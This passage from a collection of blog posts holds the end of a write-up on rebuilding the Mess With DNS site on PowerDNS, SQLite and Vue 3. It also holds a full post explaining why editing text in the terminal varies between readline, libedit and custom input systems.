concept that the Mess With DNS UI has at all) \n Record orange.beryl5.messwithdns.com./A '1.2.3.4$': Parsing record content (try 'pdnsutil check-zone'): unable to parse IP address, strange character: $  (mentions “pdnsutil”, a utility which Mess With DNS’s users don’t have\naccess to in this context) \n \n\n I ended up handling this in two ways: \n\n \n Do some initial basic validation of values that users enter (like IP addresses), so I can just return errors like  Invalid IPv4 address: \"1.2.3.4$ \n If that goes well, send the request to PowerDNS and if we get an error back, then do some  hacky translation  of those messages to make them clearer. \n \n\n Sometimes users will still get errors from PowerDNS directly, but I added some\nlogging of all the errors that users see, so hopefully I can review them and\nadd extra translations if there are other common errors that come up. \n\n I think what I learned from this is that if I’m building a user-facing\napplication on top of an API, I need to be pretty thoughtful about how I\nresurface those errors to users. \n\n challenge 5: setting up SQLite \n\n Previously Mess With DNS was using a Postgres database. This was problematic\nbecause I only gave the Postgres machine 256MB of RAM, which meant that the\ndatabase got OOM killed almost every single day. I never really worked out\nexactly why it got OOM killed every day, but that’s how it was. I spent some\ntime trying to tune Postgres’ memory usage by setting the max connections /\n work-mem  /  maintenance-work-mem  and it helped a bit but didn’t solve the\nproblem. \n\n So for this refactor I decided to use SQLite instead, because the website\ndoesn’t really get that much traffic. There are some choices involved with\nusing SQLite, and I decided to: \n\n \n Run  db.SetMaxOpenConns(1)  to make sure that we only open 1 connection to\nthe database at a time, to prevent  SQLITE_BUSY  errors from two threads\ntrying to access the database at the same time (just setting WAL mode didn’t\nwork) \n Use separate databases for each of the 3 tables (users, records, and\nrequests) to reduce contention. This maybe isn’t really necessary, but there\nwas no reason I needed the tables to be in the same database so I figured I’d set\nup separate databases to be safe. \n Use the cgo-free  modernc.org/sqlite , which  translates SQLite’s source code to Go .\nI might switch to a more “normal” sqlite implementation instead at some point and use cgo though.\nI think the main reason I prefer to avoid cgo is that cgo has landed me with  difficult-to-debug errors in the past . \n use WAL mode \n \n\n I still haven’t set up backups, though I don’t think my Postgres database had\nbackups either. I think I’m unlikely to use\n litestream  for backups – Mess With DNS is very far\nfrom a critical application, and I think daily backups that I could recover\nfrom in case of a disaster are more than good enough. \n\n challenge 6: upgrading Vue & managing forms \n\n This has nothing to do with PowerDNS but I decided to upgrade Vue.js from\nversion 2 to 3 as part of this refresh. The main problem with that is that the\nform validation library I was using (FormKit) completely changed its API\nbetween Vue 2 and Vue 3, so I decided to just stop using it instead of learning\nthe new API. \n\n I ended up switching to some form validation tools that are built into the\nbrowser like  required  and  oninvalid  ( here’s the code ).\nI think it could use some of improvement, I still don’t understand forms very well. \n\n challenge 7: managing state in the frontend \n\n This also has nothing to do with PowerDNS, but when modifying the frontend I\nrealized that my state management in the frontend was a mess – in every place\nwhere I made an API request to the backend, I had to try to remember to add a\n“refresh records” call after that in every place that I’d modified the state\nand I wasn’t always consistent about it. \n\n With some more advice from Marco, I ended up implementing a single global\n state management store \nwhich stores all the state for the application, and which lets me\ncreate/update/delete records. \n\n Then my components can just call  store.createRecord(record) , and the store\nwill automatically resynchronize all of the state as needed. \n\n challenge 8: sequencing the project \n\n This project ended up having several steps because I reworked the whole\nintegration between the frontend and the backend. I ended up splitting it into\na few different phases: \n\n \n Upgrade Vue from v2 to v3 \n Make the state management store \n Implement a different backend API, move a lot of DNS logic out of the frontend, and add tests for the backend \n Integrate PowerDNS \n \n\n I made sure that the website was (more or less) 100% working and then deployed\nit in between phases, so that the amount of changes I was managing at a time\nstayed somewhat under control. \n\n the new website is up now! \n\n I released the upgraded website a few days ago and it seems to work!\nThe PowerDNS API has been great to work on top of, and I’m relieved that\nthere’s a whole class of problems that I now don’t have to think about at all,\nother than potentially trying to make the error messages from PowerDNS a little\nclearer. Using PowerDNS has fixed a lot of the DNS issues that folks have\nreported in the last few years and it feels great. \n\n If you run into problems with the new Mess With DNS I’d love to  hear about them here . \n\n"},
{"url": "https://jvns.ca/blog/2024/07/08/readline/", "title": "Entering text in the terminal is complicated", "content": "\n     \n\n The other day I asked what folks on Mastodon find confusing about working in\nthe terminal, and one thing that stood out to me was “editing a command you\nalready typed in”. \n\n This really resonated with me: even though entering some text and editing it is\na very “basic” task, it took me maybe 15 years of using the terminal every\nsingle day to get used to using  Ctrl+A  to go to the beginning of the line (or\n Ctrl+E  for the end – I think I used  Home / End  instead). \n\n So let’s talk about why entering text might be hard! I’ll also share a few tips\nthat I wish I’d learned earlier. \n\n it’s very inconsistent between programs \n\n A big part of what makes entering text in the terminal hard is the\ninconsistency between how different programs handle entering text. For example: \n\n \n some programs ( cat ,  nc ,  git commit --interactive , etc) don’t support using arrow keys at all: if you press arrow keys, you’ll just see  ^[[D^[[D^[[C^[[C^ \n many programs (like  irb ,  python3  on a Linux machine and many many more) use the  readline  library, which gives you a lot of basic functionality (history, arrow keys, etc) \n some programs (like  /usr/bin/python3  on my Mac) do support very basic features like arrow keys, but not other features like  Ctrl+left  or reverse searching with  Ctrl+R \n some programs (like the  fish  shell or  ipython3  or  micro  or  vim ) have their own fancy system for accepting input which is totally custom \n \n\n So there’s a lot of variation! Let’s talk about each of those a little more. \n\n mode 1: the baseline \n\n First, there’s “the baseline” – what happens if a program just accepts text by\ncalling  fgets()  or whatever and doing absolutely nothing else to provide a\nnicer experience. Here’s what using these tools typically looks for me – If I\nstart the version of  dash  installed on\nmy machine (a pretty minimal shell) press the left arrow keys, it just prints\n ^[[D  to the terminal. \n\n $ ls l-^[[D^[[D^[[D\n \n\n At first it doesn’t seem like all of these “baseline” tools have much in\ncommon, but there are actually a few features that you get for free just from\nyour terminal, without the program needing to do anything special at all. \n\n The things you get for free are: \n\n \n typing in text, obviously \n backspace \n Ctrl+W , to delete the previous word \n Ctrl+U , to delete the whole line \n a few other things unrelated to text editing (like  Ctrl+C  to interrupt the process,  Ctrl+Z  to suspend, etc) \n \n\n This is not  great , but it means that if you want to delete a word you\ngenerally can do it with  Ctrl+W  instead of pressing backspace 15 times, even\nif you’re in an environment which is offering you absolutely zero features. \n\n You can get a list of all the ctrl codes that your terminal supports with  stty -a . \n\n mode 2: tools that use  readline \n\n The next group is tools that use readline! Readline is a GNU library to make\nentering text more pleasant, and it’s very widely used. \n\n My favourite readline keyboard shortcuts are: \n\n \n Ctrl+E  (or  End ) to go to the end of the line \n Ctrl+A  (or  Home ) to go to the beginning of the line \n Ctrl+left/right arrow  to go back/forward 1 word \n up arrow to go back to the previous command \n Ctrl+R  to search your history \n \n\n And you can use  Ctrl+W  /  Ctrl+U  from the “baseline” list, though  Ctrl+U \ndeletes from the cursor to the beginning of the line instead of deleting the\nwhole line. I think  Ctrl+W  might also have a slightly different definition of\nwhat a “word” is. \n\n There are a lot more ( here’s a full list ), but those are the only ones that I personally use. \n\n The  bash  shell is probably the most famous readline user (when you use\n Ctrl+R  to search your history in bash, that feature actually comes from\nreadline), but there are TONS of programs that use it – for example  psql ,\n irb ,  python3 , etc. \n\n tip: you can make ANYTHING use readline with  rlwrap \n\n One of my absolute favourite things is that if you have a program like  nc \nwithout readline support, you can just run  rlwrap nc  to turn it into a\nprogram with readline support! \n\n This is incredible and makes a lot of tools that are borderline unusable MUCH\nmore pleasant to use. You can even apparently set up  rlwrap  to include your own\ncustom autocompletions, though I’ve never tried that. \n\n some reasons tools might not use readline \n\n I think reasons tools might not use readline might include: \n\n \n the program is very simple (like  cat  or  nc ) and maybe the maintainers don’t want to bring in a relatively large dependency \n license reasons, if the program’s license is not GPL-compatible – readline is GPL-licensed, not LGPL \n only a very small part of the program is interactive, and maybe readline\nsupport isn’t seen as important. For example  git  has a few interactive\nfeatures (like  git add -p ), but not very many, and usually you’re just\ntyping a single character like  y  or  n  – most of the time you need to really\ntype something significant in git, it’ll drop you into a text editor instead. \n \n\n For example idris2 says  they don’t use readline \nto keep dependencies minimal and suggest using  rlwrap  to get better\ninteractive features. \n\n how to know if you’re using readline \n\n The simplest test I can think of is to press  Ctrl+R , and if you see: \n\n (reverse-i-search)`':\n \n\n then you’re probably using readline. This obviously isn’t a guarantee (some\nother library could use the term  reverse-i-search  too!), but I don’t know of\nanother system that uses that specific term to refer to searching history. \n\n the readline keybindings come from Emacs \n\n Because I’m a vim user, It took me a very long time to understand where these\nkeybindings come from (why  Ctrl+A  to go to the beginning of a line??? so\nweird!) \n\n My understanding is these keybindings actually come from Emacs –  Ctrl+A  and\n Ctrl+E  do the same thing in Emacs as they do in Readline and I assume the\nother keyboard shortcuts mostly do as well, though I tried out  Ctrl+W  and\n Ctrl+U  in Emacs and they don’t do the same thing as they do in the terminal\nso I guess there are some differences. \n\n There’s some more  history of the Readline project here . \n\n mode 3: another input library (like  libedit ) \n\n On my Mac laptop,  /usr/bin/python3  is in a weird middle ground where it\nsupports  some  readline features (for example the arrow keys), but not the\nother ones. For example when I press  Ctrl+left arrow , it prints out  ;5D ,\nlike this: \n\n $ python3\n>>> importt subprocess;5D\n \n\n Folks on Mastodon helped me figure out that this is because in the default\nPython install on Mac OS, the Python  readline  module is actually backed by\n libedit , which is a similar library which has fewer features, presumably\nbecause Readline is  GPL licensed . \n\n Here’s how I was eventually able to figure out that Python was using libedit on\nmy system: \n\n $ python3 -c \"import readline; print(readline.__doc__)\"\nImporting this module enables command line editing using libedit readline.\n \n\n Generally Python uses readline though if you install it on Linux or through\nHomebrew. It’s just that the specific version that Apple includes on their\nsystems doesn’t have readline. Also  Python 3.13 is going to remove the readline dependency \nin favour of a custom library, so “Python uses readline” won’t be true in the\nfuture. \n\n I assume that there are more programs on my Mac that use libedit but I haven’t\nlooked into it. \n\n mode 4: something custom \n\n The last group of programs is programs that have their own custom (and sometimes\nmuch fancier!) system for editing text. This includes: \n\n \n most terminal text editors (nano, micro, vim, emacs, etc) \n some shells (like fish), for example it seems like fish supports  Ctrl+Z  for undo when typing in a command. Zsh’s line editor is called  zle . \n some REPLs (like  ipython ), for example IPython uses the  prompt_toolkit  library instead of readline \n lots of other programs (like  atuin ) \n \n\n Some features you might see are: \n\n \n better autocomplete which is more customized to the tool \n nicer history management (for example with syntax highlighting) than the default you get from readline \n more keyboard shortcuts \n \n\n custom input systems are often readline-inspired \n\n I went looking at how  Atuin  (a wonderful tool for\nsearching your shell history that I started using recently) handles text input.\nLooking at  the code \nand some of the discussion around it, their implementation is custom but it’s\ninspired by readline, which makes sense to me – a lot of users are used to\nthose keybindings, and it’s convenient for them to work even though atuin\ndoesn’t use readline. \n\n prompt_toolkit  (the library\nIPython uses) is similar – it actually supports a lot of options (including\nvi-like keybindings), but the default is to support the readline-style\nkeybindings. \n\n This is like how you see a lot of programs which support very basic vim\nkeybindings (like  j  for down and  k  for up). For example Fastmail supports\n j  and  k  even though most of its other keybindings don’t have much\nrelationship to vim. \n\n I assume that most “readline-inspired” custom input systems have various subtle\nincompatibilities with readline, but this doesn’t really bother me at all\npersonally because I’m extremely ignorant of most of readline’s features. I only use\nmaybe 5 keyboard shortcuts, so as long as they support the 5 basic commands I\nknow (which they always do!) I feel pretty comfortable. And usually these\ncustom systems have much better autocomplete than you’d get from just using\nreadline, so generally I prefer them over readline. \n\n lots of shells support vi keybindings \n\n Bash, zsh, and fish all have a “vi mode” for entering text. In a\n very unscientific poll  I ran on\nMastodon, 12% of people said they use it, so it seems pretty popular. \n\n Readline also has a “vi mode” (which is how Bash’s support for it works), so by\nextension lots of other programs have it too. \n\n I’ve always thought that vi mode seems really cool, but for some reason even\nthough I’m a vim user it’s never stuck for me. \n\n understanding what situation you’re in really helps \n\n I’ve spent a lot of my life being confused about why a command line application\nI was using wasn’t behaving the way I wanted, and it feels good to be able to\nmore or less understand what’s going on. \n\n I think this is roughly my mental flowchart when I’m entering text at a command\nline prompt: \n\n \n Do the arrow keys not work? Probably there’s no input system at all, but at\nleast I can use  Ctrl+W  and  Ctrl+U , and I can  rlwrap  the tool if I\nwant more features. \n Does  Ctrl+R  print  reverse-i-search ? Probably it’s readline, so I can use\nall of the readline shortcuts I’m used to, and I know I can get some basic\nhistory and press up arrow to get the previous command. \n Does  Ctrl+R  do something else? This is probably some custom input library:\nit’ll probably act more or less like readline, and I can check the\ndocumentation if I really want to know how it works. \n \n\n Being able to diagnose what’s going on like this makes the command line feel a\nmore predictable and less chaotic. \n\n some things this post left out \n\n There are lots more complications related to entering text that we didn’t talk\nabout at all here, like: \n\n \n issues related to ssh / tmux / etc \n the  TERM  environment variable \n how different terminals (gnome terminal, iTerm, xterm, etc) have different kinds of support for copying/pasting text \n unicode \n probably a lot more \n \n\n"}
]